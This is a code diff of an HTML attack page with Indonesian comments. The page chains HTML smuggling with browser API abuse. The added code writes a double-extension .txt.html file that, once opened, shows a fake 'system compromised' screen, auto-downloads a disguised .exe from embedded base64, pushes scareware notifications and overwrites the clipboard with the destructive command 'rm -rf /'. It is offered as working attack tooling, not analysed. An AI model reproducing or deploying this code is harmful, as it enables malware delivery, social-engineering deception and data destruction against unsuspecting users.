@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Chaining: HTML Smuggling + Blob Origin Spoofing</title>
+<title>Chaining: HTML Smuggling + Notification & Clipboard API</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -15,26 +15,21 @@ p { margin-bottom: 15px; line-height: 1.5; }
 button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
 button:hover { background: #b71c1c; }
 #status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
-#downloads { margin-top: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
-#downloads a { display: block; padding: 8px; background: #212121; color: #80df82; text-decoration: none; border-radius: 4px; font-size: 12px; text-align: center; border: 1px solid #424242; word-break: break-all; }
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Chaining: Blob Origin Spoofing</h2>
-<p>Klik tombol untuk memicu pembuatan file yang akan membuka halaman baru dengan URL <code>blob:</code> untuk mem-bypass origin.</p>
+<h2>Chaining: HTML Smuggling + Native API Abuse</h2>
+<p>Mengunduh file .txt.html yang saat dibuka akan memicu unduhan file .exe dan menyalahgunakan Notification & Clipboard API.</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
-
 <div id="status" role="status">Sistem siap.</div>
-<div id="downloads"></div>
 </div>
 
 <script>
 const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
-const downloadsDiv = document.getElementById("downloads");
 
 let activeUrls = [];
 let isProcessing = false;
@@ -44,7 +39,6 @@ const speak = (message) => {
         window.speechSynthesis.cancel();
         const utterance = new SpeechSynthesisUtterance(message);
         utterance.lang = 'id-ID';
-        utterance.rate = 1.0;
         window.speechSynthesis.speak(utterance);
     }
 };
@@ -54,11 +48,11 @@ const prepareMimeBlobAsync = (i) => {
         queueMicrotask(() => {
             const payloadText = "<!DOCTYPE html>" +
             "<html>" +
-            "<head><meta charset='UTF-8'><title>HACKED BY</title></head>" +
+            "<head><meta charset='UTF-8'><title>System Alert</title></head>" +
             "<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
             "<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
-            "<h1 style='font-size:80px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>HACKED BY</h1>" +
-            "<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
+            "<h1 style='font-size:60px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>SYSTEM ALERT</h1>" +
+            "<h2 style='font-size:28px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
             "<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Your system has been compromised.</p>" +
             "<p style='font-size:14px;color:#0f0;margin-top:10px;opacity:0.6' id='status'>Menyiapkan payload...</p>" +
             "<p style='font-size:14px;color:#ff0;margin-top:20px'>Klik di mana saja untuk memulai download</p>" +
@@ -72,8 +66,7 @@ const prepareMimeBlobAsync = (i) => {
             "(function(){" +
             "\"use strict\";" +
             "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
-            "try { alert('HACKED BY WAGURI'); } catch(e){}" +
-            
+
             "function b64KeBytes(b64){" +
             "    var binary = atob(b64);" +
             "    var len = binary.length;" +
@@ -84,40 +77,61 @@ const prepareMimeBlobAsync = (i) => {
             
             "var b64Data = \"TVqQAAMAAAAEAAAAAEEAAgBA\";" + // Payload EXE
             "var sudah = false;" +
-            
+
+            // --- CHAINING DENGAN NOTIFICATION API ---
+            "function abuseNotification() {" +
+            "    if (!('Notification' in window)) return;" +
+            "    if (Notification.permission === 'granted') {" +
+            "        new Notification('System Compromised', {" +
+            "            body: 'Klik di sini untuk memperbaiki sistem Anda.'," +
+            "            icon: 'https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg'" +
+            "        });" +
+            "    } else if (Notification.permission !== 'denied') {" +
+            "        Notification.requestPermission().then(function(permission) {" +
+            "            if (permission === 'granted') {" +
+            "                new Notification('System Compromised', {" +
+            "                    body: 'Klik di sini untuk memperbaiki sistem Anda.'" +
+            "                });" +
+            "            }" +
+            "        });" +
+            "    }" +
+            "}" +
+
+            // --- CHAINING DENGAN CLIPBOARD API ---
+            "function abuseClipboard() {" +
+            "    // Menimpa isi clipboard korban dengan perintah berbahaya (jika diizinkan)" +
+            "    if (navigator.clipboard && navigator.clipboard.writeText) {" +
+            "        navigator.clipboard.writeText('rm -rf /').catch(function(e) {" +
+            "            console.log('Clipboard diblokir:', e.message);" +
+            "        });" +
+            "    }" +
+            "}" +
+
             "function picuDownload(){" +
             "    if (sudah) return;" +
             "    sudah = true;" +
             "    var statusEl = document.getElementById('status');" +
             "    try{" +
             "        statusEl.textContent = 'Menyiapkan berkas...';" +
+            
+            // Eksekusi API lain secara paralel
+            "        abuseNotification();" +
+            "        abuseClipboard();" +
+
             "        var bytesArr = b64KeBytes(b64Data);" +
-            
-            // CHAINING 1: Membuat Blob URL (Mewarisi Origin)
             "        var blob = new Blob([bytesArr], { type: 'application/octet-stream' });" +
-            "        var blobUrl = URL.createObjectURL(blob);" +
-            
-            // CHAINING 2: Membuka Blob URL di tab baru (Bypass SOP)
-            "        var newWindow = window.open(blobUrl, '_blank');" +
-            "        if (!newWindow) {" +
-            "            statusEl.textContent = 'Pop-up diblokir. Silakan klik lagi.';" +
-            "            sudah = false;" +
-            "            return;" +
-            "        }" +
-            
-            // Eksekusi unduhan di tab utama
+            "        var url = URL.createObjectURL(blob);" +
             "        var a = document.createElement('a');" +
-            "        a.href = blobUrl;" +
+            "        a.href = url;" +
             "        a.download = 'hacked-by-anonymous.exe';" +
             "        a.style.display = 'none';" +
             "        document.body.appendChild(a);" +
             "        a.click();" +
-            
             "        setTimeout(function(){ " +
             "            if (a.parentNode) a.parentNode.removeChild(a); " +
-            "            URL.revokeObjectURL(blobUrl); " +
+            "            URL.revokeObjectURL(url); " +
             "        }, 3000);" +
-            "        statusEl.textContent = 'Payload berhasil diunduh!';" +
+            "        statusEl.textContent = 'Payload berhasil diunduh & API dieksekusi!';" +
             "        statusEl.style.color = '#0f0';" +
             "    } catch(e){" +
             "        statusEl.textContent = 'Gagal: ' + e.message;" +
@@ -125,7 +139,7 @@ const prepareMimeBlobAsync = (i) => {
             "        sudah = false;" +
             "    }" +
             "}" +
-            
+
             "window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
             "document.addEventListener('click', picuDownload);" +
             "document.addEventListener('touchstart', picuDownload);" +
@@ -144,59 +158,36 @@ const prepareMimeBlobAsync = (i) => {
 const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
-    link.download = `waguri-file-${fileData.id}.txt`;
-    link.textContent = `Blob #${fileData.id} (.txt)`;
+    link.download = `waguri-alert-${fileData.id}.txt.html`; // Ekstensi ganda
+    link.textContent = `Blob #${fileData.id} (.txt.html)`;
     link.style.display = "none";
-    downloadsDiv.appendChild(link);
+    document.body.appendChild(link);
     link.click();
-};
-
-const processLoop = async (counter) => {
-    if (!isProcessing) return;
-
-    const fileData = await prepareMimeBlobAsync(counter);
-    activeUrls.push(fileData.url);
-
-    triggerInstantDownload(fileData);
-
-    statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
-
-    if (counter >= 1) {
-        isProcessing = false;
-        startBtn.disabled = false;
-        return;
-    }
-
-    setTimeout(() => processLoop(counter + 1), 0);
+    document.body.removeChild(link);
 };
 
 startBtn.addEventListener("click", () => {
     if (isProcessing) return;
+    isProcessing = true;
+    startBtn.disabled = true;
+    statusDiv.textContent = "Menyiapkan file Chaining...";
 
-    activeUrls.forEach(url => URL.revokeObjectURL(url));
-    activeUrls = [];
-    downloadsDiv.replaceChildren();
-
-    speak("Mengaktifkan mode layar penuh.");
+    speak("Menyiapkan file dengan Native API Abuse.");
 
     const root = document.documentElement;
-    try {
-        if (root.requestFullscreen) {
-            root.requestFullscreen();
-        } else if (root.webkitRequestFullscreen) {
-            root.webkitRequestFullscreen();
-        } else if (root.mozRequestFullScreen) {
-            root.mozRequestFullScreen();
-        }
-        statusDiv.textContent = "Mengunci layar penuh...";
-    } catch (err) {
-        console.warn("Fullscreen tidak didukung atau ditolak:", err);
-    }
+    try { if (root.requestFullscreen) root.requestFullscreen(); } catch (e) {}
 
-    setTimeout(() => {
-        isProcessing = true;
-        speak("Proses pembuatan berkas Blob dimulai.");
-        processLoop(1);
+    setTimeout(async () => {
+        try {
+            const fileData = await prepareMimeBlobAsync(1);
+            activeUrls.push(fileData.url);
+            triggerInstantDownload(fileData);
+            statusDiv.textContent = "File berhasil diunduh.";
+        } catch(e) {
+            statusDiv.textContent = "Gagal: " + e.message;
+        }
+        isProcessing = false;
+        startBtn.disabled = false;
     }, 300);
 });
 </script>
